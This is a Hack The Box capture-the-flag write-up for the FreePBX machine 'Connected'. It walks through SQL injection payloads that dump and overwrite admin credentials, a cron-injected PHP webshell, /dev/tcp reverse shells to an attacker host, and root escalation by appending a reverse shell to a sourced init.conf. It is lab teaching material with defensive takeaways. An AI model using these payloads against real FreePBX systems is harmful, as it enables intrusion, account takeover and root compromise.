# HTB Write-Up: Connected

| Field      | Details                                                              |
|------------|----------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Connected)        |
| Difficulty | Easy                                                                 |
| OS         | Linux (CentOS 7 / Sangoma FreePBX)                                   |
| Date       | June 8, 2026                                                         |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Foothold — SQL Injection (CVE-2025-57819)](#2-foothold--sql-injection-cve-2025-57819)
3. [Initial Access — RCE via Cron Injection](#3-initial-access--rce-via-cron-injection)
4. [User Flag](#4-user-flag)
5. [Privilege Escalation — incron + dahdi init.conf Sourcing](#5-privilege-escalation--incron--dahdi-initconf-sourcing)
6. [Root Flag](#6-root-flag)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap**:

```bash
nmap -p- --min-rate 10000 -n -Pn 10.129.x.x
```

**Open Ports:**

| Port | Service | Details                          |
|------|---------|----------------------------------|
| 22   | SSH     | OpenSSH (CentOS 7)               |
| 80   | HTTP    | Apache 2.4.6 — FreePBX 16.0.40.7 |
| 443  | HTTPS   | Apache 2.4.6 — FreePBX 16.0.40.7 |

The web server at `http://connected.htb` redirects to `/admin/config.php` — the FreePBX administration login panel.

Add the hostname to `/etc/hosts`:

```bash
echo "10.129.x.x connected.htb" >> /etc/hosts
```

**Technology Stack:**
- Application: FreePBX 16.0.40.7
- OS: CentOS 7.x
- Web Server: Apache 2.4.6
- Backend: PHP 7.4.16
- Database: MariaDB (MySQL)

---

## 2. Foothold — SQL Injection (CVE-2025-57819)

### Vulnerability

FreePBX 16.0.40.7 is vulnerable to **unauthenticated SQL injection** via the `brand` parameter in the endpoint module's AJAX handler (`/admin/ajax.php`). This affects FreePBX versions 15, 16, and 17.

### Confirming Injection

```bash
curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

**Response:**
```json
{"error":{"message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'"}}
```

The injection is confirmed — the database user is `freepbxuser@localhost`.

### Dumping Admin Credentials

Use **sqlmap** to automate extraction:

```bash
sqlmap -u "http://connected.htb/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x*" \
  --technique=E \
  --dbms=mysql \
  --level=3 \
  --risk=2 \
  -D asterisk -T ampusers --dump \
  --batch
```

**Result:**

| username | password_sha1                            |
|----------|------------------------------------------|
| admin    | 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a |

The SHA1 hash did not crack with rockyou. Instead, **overwrite the admin password directly via SQLi**:

```bash
curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';UPDATE+ampusers+SET+password_sha1=SHA1('hacked123')+WHERE+username='admin';--+"
```

Login to FreePBX at `http://connected.htb/admin` with `admin:hacked123`.

---

## 3. Initial Access — RCE via Cron Injection

### CVE-2025-61678

With an authenticated session, the SQL injection can be further abused to **inject a cron job** that drops a PHP webshell:

```bash
# Base64 of: <?php if(isset($_GET['c'])){ system($_GET['c']); } ?>
WEBSHELL="PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2MnXSkpeyBzeXN0ZW0oJF9HRVRbJ2MnXSk7IH0gPz4="

curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','shell','echo+\"${WEBSHELL}\"%7Cbase64+-d+%3E%2Fvar%2Fwww%2Fhtml%2Fshell.php',NULL,'*+*+*+*+*',30,1,1)+--+"
```

Wait up to 60 seconds for cron to execute, then verify and trigger a reverse shell:

```bash
# Start listener
nc -nvlp 9001

# Trigger reverse shell via webshell
curl "http://connected.htb/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F9001%200%3E%261%22"
```

Alternatively, use the existing exploit script:

```bash
git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git
cd FreePBX-CVE-2025-57819-RCE
pip install requests pwntools --break-system-packages
python3 exploit.py --rhost connected.htb --http --rport 80 --lhost 10.10.14.x --lport 9001
```

Shell received as `asterisk`.

---

## 4. User Flag

```bash
cat /home/asterisk/user.txt
# 4cb43dce6654001f07ebdce279a772b6
```

---

## 5. Privilege Escalation — incron + dahdi init.conf Sourcing

### Enumeration

Checking the system's incron rules reveals filesystem-triggered commands that run as **root**:

```bash
cat /etc/incron.d/legacy
```

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

The `asterisk` user has **write access** to `/var/spool/asterisk/sysadmin/`:

```bash
ls -la /var/spool/asterisk/sysadmin/dahdi_restart
# -rw-rw-r--. 1 asterisk asterisk ...
```

Tracing the execution chain:

```
Write to dahdi_restart
    ↓
incron triggers /usr/sbin/sysadmin_dahdi_restart (as root)
    ↓
sysadmin_dahdi_restart calls /etc/init.d/dahdi restart
    ↓
/etc/init.d/dahdi contains: [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
    ↓
/etc/dahdi/init.conf is writable by asterisk!
```

### The Smoking Gun

```bash
cat /etc/init.d/dahdi | grep init.conf
# [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

The `.` (dot/source) command executes `/etc/dahdi/init.conf` **in the context of the running shell** — which is root. Any commands placed in that file run as root.

```bash
ls -la /etc/dahdi/init.conf
# -rw-rw-r--. 1 root asterisk ...  ← writable by group asterisk!
```

### Exploitation

```bash
# 1. Start second listener on Kali
nc -nvlp 9002

# 2. Inject reverse shell into the sourced config file
echo 'bash -i >& /dev/tcp/10.10.14.x/9002 0>&1' >> /etc/dahdi/init.conf

# 3. Trigger the incron watcher
echo "trigger" > /var/spool/asterisk/sysadmin/dahdi_restart
```

Root shell received:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 6. Root Flag

```bash
cat /root/root.txt
```

---

## 7. Summary

| Phase          | Technique                                      | Result                              |
|----------------|------------------------------------------------|-------------------------------------|
| Recon          | Nmap + web enumeration                         | FreePBX 16.0.40.7 identified        |
| SQLi           | CVE-2025-57819 — error-based EXTRACTVALUE      | DB user + admin hash dumped         |
| Auth Bypass    | SQLi UPDATE on ampusers                        | Admin password overwritten          |
| RCE            | CVE-2025-61678 — cron job injection + webshell | Shell as `asterisk`                 |
| PrivEsc Step 1 | incron rule watching sysadmin spool directory  | Root-triggered script chain found   |
| PrivEsc Step 2 | dahdi init script sources writable init.conf   | Reverse shell injected, root gained |
| Root           | `cat /root/root.txt`                           | Root flag captured                  |

### Key Takeaways

- **Unauthenticated SQLi is critical when it touches authentication tables.** CVE-2025-57819 allowed not just data extraction but direct credential overwrite, bypassing the need to crack the admin hash entirely. Always test for write primitives, not just read.

- **Trace execution chains through init scripts.** The privesc was not in the incron rule itself but three levels deep: incron → sysadmin script → init.d script → sourced config file. Automated tools often miss this kind of chained misconfiguration.

- **The `.` (source) operator in shell scripts is a powerful attack primitive.** When a privileged script sources a file that an unprivileged user controls, it is equivalent to direct code execution as that privileged user. Audit all `source`, `.`, and `include` calls in root-run scripts, especially those referencing paths outside `/root` or `/etc` with broad permissions.

- **incron deserves the same scrutiny as cron.** It is less commonly audited but equally powerful — filesystem event triggers that invoke root commands are a significant attack surface in applications like FreePBX that rely heavily on file-based IPC.
